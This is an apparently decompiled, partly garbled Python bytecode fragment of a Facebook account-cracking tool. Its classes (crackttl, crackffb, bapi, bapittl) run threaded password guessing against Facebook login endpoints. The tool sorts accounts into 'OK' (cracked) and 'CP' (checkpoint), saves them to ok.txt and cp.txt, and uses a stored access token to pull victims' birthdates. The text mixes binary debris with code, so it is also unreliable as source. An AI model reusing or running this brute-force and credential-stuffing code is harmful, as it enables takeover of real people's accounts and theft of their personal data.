__module__�__qualname__r1   r2   r   rN  rF  rI  r   r   r   r   r�   k  s
   
3r�   c                   @   s4   e Zd Ze�d� e�  dd� Zdd� Zdd� ZdS )	r�   r,   c              
   C   s  g | _ g | _d| _ttd t d t d t d � ttd t d t d t d �}|dkrfq6q6|d	k�r�z�z"|| _t| j��	� �
� | _W q�W qr ty� } z$td
| � W Y d }~qrW Y d }~qrd }~0 0 qrg | _| jD ]4}z| j�d|�d�d i� W q�   Y q�Y q�0 q�W n> t�yV } z$td
| � W Y d }~q6W Y d }~n
d }~0 0 ttd t d t d t d � | ��  �qq6|dkr6z�z$|| _t| j��	� �
� | _W �q�W n@ t�y� } z&td
| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q
Y n0 �q
W n2 t�y� } ztd
| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �qq6d S �Nr   rr   r�   rt   r9  r�   r�   r   r�   r:  r   r�   r;  r+  r^   r<  rQ  r=  rR  r>  r?  rK  r   r   r   rN  �  s^    $$
$
"$
(
."dzcrackttl.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t d t d t d t d � t
d��| j| j� t�| j� t�  d S rO  rT  rU  r   r   r   rF  �  s    ,

dzcrackttl.pwlistc              
   C   s  �z�|� d�D �]�}t|� d�|d�}|� d�dk�rLz�t� d|� d� d tdd	���  �}t�|j�}|d
 }td|� d�||f � | j	�
d|� d�||f � tdd��d|� d�||f � W  �q�W n$ ttfy�   d}Y n   Y n0 td|� d�|f � | j	�
d|� d�|f � tdd��d|� d�|f �  �q�q|� d�dkrtd|� d�|f � | j�
d|� d�|f � tdd��d|� d�|f �  �q�qqq|  jd7  _td| jt| j�t| j�t| j	�f dd� tj��  W n   | �|� Y n0 d S )Nr�   r   rV  r0  r�   r�   r�   r�   r   r  u5   [0;33m[[0;37mCP[0;33m] %s • %s • %s          u   %s • %s • %sr�   rY  u   %s • %s • %s
r�   rW  rX  rZ  r.  r[  r�   r^   r\  r]  )r;   r7  r:   r   r   r�   r�   r=   r   r�   re   r%   r�   r�   r@  rA  rc   rE  r#   r$   r&   rI  )rL  rE  r@   r`  �ke�tt�ttlr   r   r   rI    s>    
�& :zcrackttl.mainNra  r   r   r   r   r�   �  s
   
3r�   c                   @   s4   e Zd Ze�d� e�  dd� Zdd� Zdd� ZdS )	r�   r,   c              
   C   s  g | _ g | _d| _ttd t d t d t d � ttd t d t d t d �}|dkrfq6q6|d	k�r�z�z"|| _t| j��	� �
� | _W q�W qr ty� } z$td
| � W Y d }~qrW Y d }~qrd }~0 0 qrg | _| jD ]4}z| j�d|�d�d i� W q�   Y q�Y q�0 q�W n> t�yV } z$td
| � W Y d }~q6W Y d }~n
d }~0 0 ttd t d t d t d � | ��  �qq6|dkr6z�z$|| _t| j��	� �
� | _W �q�W n@ t�y� } z&td
| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q
Y n0 �q
W n2 t�y� } ztd
| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �qq6d S re  r?  rK  r   r   r   rN  '  s^    $$
$
"$
(
."dzcrackffb.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t d t d t d t d � t
d��| j| j� t�| j� t�  d S rO  rT  rU  r   r   r   rF  Z  s    ,

dzcrackffb.pwlistc                 C   sN  �z0|� d�D ]�}t|� d�|d�}|� d�dkr�td|� d�|f � | j�d|� d�|f � tdd	��d
|� d�|f �  q�q|� d�dkrtd|� d�|f � | j�d|� d�|f � tdd	��d
|� d�|f �  q�qqq|  jd7  _td| jt	| j
�t	| j�t	| j�f dd� tj��  W n   | �|� Y n0 d S )Nr�   r   zhttps://free.facebook.comr0  r�   rW  rX  r�   rY  rZ  r.  r[  r�   r^   r\  r�   r]  )r;   r8  r   r�   re   r   r%   r@  rA  rc   rE  r#   r$   r&   rI  r_  r   r   r   rI  e  s(    
�:zcrackffb.mainNra  r   r   r   r   r�   $  s
   
3r�   c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
r�   c                 C   s&   d| _ g | _g | _d| _| �|� d S �NFr   �r  r�   r�   �loopr�   �rL  rM  r   r   r   rN  |  s
    zbapi.__init__c              
   C   s�  t td t d t d t d � ttd t d t d t d �}|dv rxt td t d t d t d	 � q$q$|d
v �r|�z4z$|| _t| j��� �� | _W �qW q� t	�y } z@t td t d t d t d|  � W Y d }~q�W Y d }~q�d }~0 0 q�g | _
t td t d t d t d � ttd t d t d t d ��d�| _t| j�dk�rrW q$| jD ]<}z"| j
�|�d�d | jd�� W n   Y �qxY n0 �qxW n> t	�y� } z$t d| � W Y d }~q$W Y d }~n
d }~0 0 t td t d t d t d t d t d t d t d t d t d t d t d � td��| j| j
� t�  �q�q$|dv r$z�z$|| _t| j��� �� | _W �q�W n< t	�y� } z"t |� W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _
| jD ]H}z.| j
�|�d�d t|�d�d �d�� W n   Y �q�Y n0 �q�W n   Y q$Y n0 t td t d t d t d t d t d t d t d t d t d t d t d � td��| j| j
� t�| j� t�  �q�q$d S �Nrr   r�   rt   r9  r�   r�   )r   r�   rs   z Invalid Number)r�   �Mz %sr;  rP  r  r   r�   r<  z  %srQ  r=  rR  rS  )r+  �Dr^   �r   rl   rm   r�   rB  r   r   rC  rD  r�   rE  rj   r�   rc   re   rG  rH  r�   r>   r  r1   rJ  rK  r   r   r   r�   �  sh    $$$

($$,
""d
(
.
dz	bapi.krahc              
   C   s  ddd|d|dddd�	}d	}t j||d
�}t�d|j�r�| j�|d | � td||tf � t�|d | � t	dd�}|�
t|�d t|� d � |��  dS d|�� d v �r| j�|d | � td||tf � t	dd�}|�
t|�d t|� d � |��  dS dS )Nr  r	  rz   r
  r  rN   r  r  r  r  r  �    • �6   [0;32m[[0;37mOK[0;32m] %s • %s %s               r�   r6   r"   Tr  r  u6   [0;33m[[0;37mCP[0;33m] %s • %s %s               r�   rY  F)r:   r;   r[   r�   r=   r�   re   r   �Nr   r%   r�   r   r�   r�   )rL  r  r  r  r  r  �saver   r   r   �bruteRequest�  s&    

zbapi.bruteRequestc                 C   s4  | j dkr�|  jd7  _|d D ]z}|d �� }|�� }z| �||�dkrPW  q�W n   Y q Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q n�|  jd7  _| j D ]|}td �� }|�� }z| �||�dkr�W  �q0W n   Y q�Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q�d S �	NFr^   r�   r   Tr\  r�   r]  �r  rk  r0   ru  r   rc   rE  r�   r�   r#   r$   r&   Zusers�rL  rE  r�   r  r  r   r   r   r�   �  s*    


:

z
bapi.bruteN�rb  rc  rd  rN  r�   ru  r�   r   r   r   r   r�   {  s   9r�   c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
r�   c                 C   s&   d| _ g | _g | _d| _| �|� d S ri  rj  rl  r   r   r   rN  �  s
    zbapittl.__init__c              
   C   s�  t td t d t d t d � ttd t d t d t d �}|dv rxt td t d t d t d	 � q$q$|d
v �r|�z4z$|| _t| j��� �� | _W �qW q� t	�y } z@t td t d t d t d|  � W Y d }~q�W Y d }~q�d }~0 0 q�g | _
t td t d t d t d � ttd t d t d t d ��d�| _t| j�dk�rrW q$| jD ]<}z"| j
�|�d�d | jd�� W n   Y �qxY n0 �qxW n> t	�y� } z$t d| � W Y d }~q$W Y d }~n
d }~0 0 t td t d t d t d t d t d t d t d t d t d t d t d � td��| j| j
� t�  �q�q$|dv r$z�z$|| _t| j��� �� | _W �q�W n< t	�y� } z"t |� W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _
| jD ]H}z.| j
�|�d�d t|�d�d �d�� W n   Y �q�Y n0 �q�W n   Y q$Y n0 t td t d t d t d t d t d t d t d t d t d t d t d � td��| j| j
� t�| j� t�  �q�q$d S rm  rp  rK  r   r   r   r�   �  sh    $$$

($$,
""d
(
.
dzbapittl.krahc           	   
   C   sr  ddd|d|dddd�	}d	}t j||d
�}t�d|j�r�| j�|d | � td||tf � t�|d | � t	dd�}|�
t|�d t|� d � |��  dS d|�� d v �rnz<t �dt|� d t	dd���  �}t�|j�}|d aW n   Y n0 | j�|d | d t � td||tf � t	dd�}|�
t|�d t|� d tt� d � |��  dS dS )Nr  r	  rz   r
  r  rN   r  r  r  r  r  rq  rr  r�   r6   r"   Tr  r  r�   r�   r�   r   r  u2   [0;33m[[0;37mCP[0;33m] %s • %s • %s[0m   r�   rY  F)r:   r;   r[   r�   r=   r�   re   r   rs  r   r%   r�   r   r�   r   r�   rh  r�   )	rL  r  r  r  r  r  rt  rf  rg  r   r   r   ru  )  s0    
$
*zbapittl.bruteRequestc                 C   s4  | j dkr�|  jd7  _|d D ]z}|d �� }|�� }z| �||�dkrPW  q�W n   Y q Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q n�|  jd7  _| j D ]|}td �� }|�� }z| �||�dkr�W  �q0W n   Y q�Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q�d S rv  rw  rx  r   r   r   r�   D  s*    


:

zbapittl.bruteNry  r   r   r   r   r�   �  s   9r�   c                 C   s�   t | �dkr tdtt | �� � t |�dkr@tdtt |�� � t | �dkr�t |�dkr�td� ttd t d t d t d � d S )	Nr   z[OK] : z[CP] : r"   r�   rs   rt   � No Result Found)rc   r   r�   rl   rm   )ZDapuntaZKrahkrahr   r   r   r  ^  s    r  c                   C   s&  t �d� t�  ttd t d t d t � ttd t d t d t � zt �d� W n6 ty�   ttd t d t d	 t d
 � Y n0 ttd t d t d t � zt �d� W n6 ty�   ttd t d t d	 t d
 � Y n0 ttd t d t d t � t	�  d S )Nr,   r�   zResult Crackr�   ZOKz
cat ok.txtr�   rs   rt   rz  ZCPz
cat cp.txtr�   )
r1   r2   r   r   rl   rm   r�   r�   r�   r�   r   r   r   r   r�   g  s    
  * * r�   �__main__)yr�   Zemail.mime.multipartr   Zemail.mime.textr   r:   Z	mechanize�
subprocessr9   r#   r1   Zuuidr   r'   r[   �base64Zconcurrent.futuresr   r�   r   r   r   rG  r   r   r	   ZnowZcurrentr;   r=   r�   Zalamatr�   r�   rm   r�   r�   rl   r   �u�oZlamanZcontentZafter_bs�findZ	find_dataZ
find_versiZ
find_pesanZversr   r   r>   r   r2   r/   r0   rs  �G�O�Rr   rY   r�   r�   rh  r�   �strftimeZdurasiZyearZtahunZmonthZbulanZdayZharir   Z	_ALL_ONESr   r   r    r   r!   r+   r,   rA   rH   r<   rh   rE   ro   rn   rG   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  r�   r�   r#  r%  r&  r7  r8  r�   r�   r�   r�   r�   r  r�   rb  r   r   r   r   �<module>   s�   x	



;#G" !T&	WbWnu	
